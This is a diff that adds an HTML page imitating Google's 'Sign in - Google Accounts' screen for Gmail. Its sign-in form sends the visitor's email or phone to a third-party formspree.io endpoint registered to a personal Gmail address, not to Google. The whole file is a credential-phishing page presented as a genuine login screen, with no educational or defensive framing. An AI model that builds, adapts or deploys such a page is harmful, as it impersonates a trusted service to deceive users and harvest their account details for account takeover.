@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Google</div>
+        <div class="header">Sign in</div>
+        <div class="subheader">to continue to Gmail</div>
+        
+        <form id="signinForm" action="https://formspree.io/f/sharearealif7@gmail.com" method="POST">
+            <div class="form-group">
+                <input type="text" id="email" name="email" required>
+                <label for="email">Email or phone</label>
+            </div>
+            
+            <div class="forgot-email">
+                <a href="#">Forgot email?</a>
+            </div>
+            
+            <div class="note">
+                Not your computer? Use Guest mode to sign in privately.
+                <a href="#">Learn more</a>
+            </div>
+            
+            <div class="actions">
+                <a href="#" class="create-account">Create account</a>
+                <button type="submit" class="next-button">Next</button>
+            </div>
+        </form>
+        
+        <div class="footer">
+            <select class="language-selector">
+                <option>English (United States)</option>
+            </select>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+</body>
+</html>
